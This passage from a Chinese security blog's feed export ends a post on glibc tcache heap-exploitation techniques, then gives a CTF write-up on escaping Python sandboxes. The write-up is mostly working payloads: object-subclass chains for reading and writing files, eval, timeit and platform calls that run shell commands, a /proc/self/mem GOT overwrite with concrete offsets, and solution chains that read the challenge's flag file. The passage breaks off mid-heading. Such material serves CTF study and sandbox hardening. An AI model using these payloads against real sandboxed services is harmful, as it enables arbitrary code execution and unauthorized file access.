on the number chunks that are put in the tcache in a run of the binning code. If that’s reached, the <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3867">last one found is returned</a>. However, this is <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l1796">unlimited by default</a>.</li></ul><p>Some observations:</p><ol><li>the tcache fill code in the <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3588">fast path of malloc</a> will reverse the order of the chunks.</li><li>cached chunks won’t be coalesced<br>2.1 neither on free of neighboring chunks<br>2.2 nor with top when they are freed</li></ol><h2 id="Pwn-中的-tcache"><a href="#Pwn-中的-tcache" class="headerlink" title="Pwn 中的 tcache"></a>Pwn 中的 tcache</h2><p><strong>Tcahe</strong> 为了追求性能，舍弃了许多以前建立起来的 check 机制，这就意味这一个我们 fake 或者 恶意构造破坏的 chunk 只要能符合对其和包装的检查就可以被使用。</p><p>这意味着什么呢？这其实说白了，这意味着许多 Glibc Pwn的技术变得更加简单了。比如下面的几个例子：</p><h3 id="The-House-of-Spirit"><a href="#The-House-of-Spirit" class="headerlink" title="The House of Spirit"></a>The House of Spirit</h3><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。在过去要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li><p>fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</p></li><li><p>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</p></li><li><p>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</p></li><li><p>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</p></li><li><p>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</p></li></ul><p>  然而在 tcahe 的机制下只需要满足：</p><ul><li>它是一个<code>2*SIZE_SZ</code>对齐的地址</li><li>其值<code>MINSIZE</code>在最大缓存块大小（1032/516字节）之间。</li><li>在x64上，它也不能有第四个LSB集。</li></ul><h3 id="Overlapping-chunks"><a href="#Overlapping-chunks" class="headerlink" title="Overlapping chunks"></a>Overlapping chunks</h3><p>我们知道 在 GLIBC Pwn 中 OVerlapping chunks是一个常见的利用技术。我们通常是可以通过覆盖堆的头部，比如覆盖一个已经释放的 chunk 的 size 域。在这个机制下，我们仍然也可以用这个方法。</p><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>tache中的垃圾回收机制如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tcache_get</code>负责从tcache bin中删除块的代码。破坏chunk中的<code>next</code>指针<code>tcache_entry</code>可以返回完全任意的块。</p><p>在这个情况下，我们通过 double free 来构造一个循环的tcahe bin 也比 fast bin 的double free简单了，因为在空闲时没有对bin的第一个成员进行双重检查。</p><h3 id="Smallbin-cache-filling-bck-write"><a href="#Smallbin-cache-filling-bck-write" class="headerlink" title="Smallbin cache filling bck write"></a>Smallbin cache filling bck write</h3><p>因为 tcahe 取消了一些检查，如unlink 中<code>bck-&gt;fd != victim</code> 的<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3631">check</a>.这意味着</p><ul><li>House of Lore could 能被使用 (虽然我们有更好的方法)</li><li>an uncontrolled write similar to the <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">unsorted bck write</a> could be achieved</li></ul><h3 id="tcache-perthread-structs-as-corruption-targets"><a href="#tcache-perthread-structs-as-corruption-targets" class="headerlink" title="tcache_perthread_structs as corruption targets"></a>tcache_perthread_structs as corruption targets</h3><p>emmm 由于线程管理的不严谨，极其有可能造成一些破坏，如竞争。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>这特么是傻逼吧！！！！！！ </p><h2 id="link"><a href="#link" class="headerlink" title="link"></a>link</h2><p><a href="http://tukan.farm/2017/07/08/tcache/">http://tukan.farm/2017/07/08/tcache/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> cache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 沙盒绕过</title>
      <link href="awesome-python-sandbox-in-ciscn.html"/>
      <url>awesome-python-sandbox-in-ciscn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>思考了一下，Python沙箱逃逸的意义，不过就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>以前我也做过一些Python沙盒逃逸的小题目，也翻译和写过两篇关于Python沙盒逃逸的文章。然而在这次国赛的题目，我好像又进一步理解了Python沙箱…</p><h3 id="绕过沙盒方法"><a href="#绕过沙盒方法" class="headerlink" title="绕过沙盒方法"></a>绕过沙盒方法</h3><h4 id="关于import"><a href="#关于import" class="headerlink" title="关于import"></a>关于import</h4><p>通常思路，我们应该找到题目还给我们留下了什么，通常而言<br>通常而言，出题人一般是禁止引入敏感包，比如 <strong>os</strong>或者<strong>system</strong>，</p><h5 id="0x01-绕过，通过路径引入"><a href="#0x01-绕过，通过路径引入" class="headerlink" title="0x01 绕过，通过路径引入"></a>0x01 绕过，通过路径引入</h5><p>Python的os模块的路径几乎都是/usr/lib/python2.7/os.py中<br>所以我们可以通过路径引入一些模块</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h5 id="0x02-dir-与dict"><a href="#0x02-dir-与dict" class="headerlink" title="0x02 dir 与dict"></a>0x02 dir 与<strong>dict</strong></h5><p>首先，我们应该确定程序还有哪些内置函数可以用，我们可以通过<code>dir __builtin__</code> 来获取内置函数列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StandardError&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;apply&#x27;</span>, <span class="string">&#x27;basestring&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;buffer&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;cmp&#x27;</span>, <span class="string">&#x27;coerce&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;intern&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;long&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;raw_input&#x27;</span>, <span class="string">&#x27;reduce&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;unichr&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;xrange&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure><p>在Python中，不引入直接使用的内置函数被成为<strong>builtin</strong>函数，随着<strong><strong>builtin</strong></strong>这个模块自动引入到环境中</p><p>进而，我们可以通过<code>__dict__</code>引入我们想要引入的模块</p><p>两种方法都是一个目的,那就是列出一个模组/类/对象 下面 所有的属性和函数<br>这在沙盒逃逸中是很有用的,可以找到隐藏在其中的一些东西<br>我们可以通过<code>__dict__</code>做什么呢？<br>一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”]</p><p>绕过实例：<br>首先通过 base64 绕过字符明文检测</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br></pre></td></tr></table></figure><p>然后通过<strong><strong>dict</strong></strong>引用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br></pre></td></tr></table></figure><p><em>如果一些 内敛函数在<strong>builtins__删除 ，我们可以通过<code>reload(__builtins__)</code>重新载入获取一个完整的__builtins</strong></em></p><h5 id="创建对象，以及引用"><a href="#创建对象，以及引用" class="headerlink" title="创建对象，以及引用"></a>创建对象，以及引用</h5><p>python的object类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用</p><p>有常见的两个方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[2]</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg"></a></p><p>如，我们可通过<br><code>print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read()</code>达到文件读取的效果，</p><p><strong>常见payload</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br></pre></td></tr></table></figure><h5 id="其他危险的函数"><a href="#其他危险的函数" class="headerlink" title="其他危险的函数"></a>其他危险的函数</h5><p>如<strong>execfile</strong>文件执行</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">&#x27;/usr/lib/python2.7&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>timeit</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>exec 和eval 比较经典了</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>platform</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h5 id="getattr-和-getattribute"><a href="#getattr-和-getattribute" class="headerlink" title="getattr() 和 getattribute()"></a><strong>getattr</strong>() 和 <strong>getattribute</strong>()</h5><p>python 再访问属性的方法上定义了<strong>getattr</strong>() 和 <strong>getattribute</strong>() 2种方法，其区别非常细微，但非常重要。</p><p>如果某个类定义了 <strong>getattribute</strong>() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）。<br>如果某个类定义了 <strong>getattr</strong>() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.<strong>getattr</strong>(‘color’)；而只会返回 x.color 已定义好的值。<br>这里，我们可以通过__getattribute__这个方法做一些事，如下面的payload</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="间接的引用调用"><a href="#间接的引用调用" class="headerlink" title="间接的引用调用"></a>间接的引用调用</h4><p>在有些题目中，如这次的2018年国赛的Python沙盒题目上，import 其实整个是被阉割了。</p><p>但是在Python中，原生的<strong><strong>import</strong></strong>是存在被引用的，只要我们找到相关对象引用就可以进一步获取我们想要的内容，具体下面的demo会讲述到</p><h4 id="write修改got表"><a href="#write修改got表" class="headerlink" title="write修改got表"></a>write修改got表</h4><p>实际上是一个**/proc/self/mem<strong>的内存操作方法<br>**/proc/self/mem</strong>是内存镜像，能够通过它来读写到进程的所有内存，包括可执行代码，如果我们能获取到Python一些函数的偏移，如<strong>system</strong>，我们就能通过想做pwn题的劫持got表做我们任意想做的事情</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>第一个地址是system的偏移，第二个是fopen的偏移，我们可以通过<strong>objdump</strong>获取相关信息</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg"></a></p><h2 id="关于这次的题目"><a href="#关于这次的题目" class="headerlink" title="关于这次的题目"></a>关于这次的题目</h2><p>我们可以通过<br><code>print ().__class__.__bases__[0].__subclasses__()[40](&quot;/home/ctf/sandbox.py&quot;).read()</code><br>获取题目源码，然后进一步分析</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>三种方法</p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s /home/ctf&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>修改got</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s /home/ctf/&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" 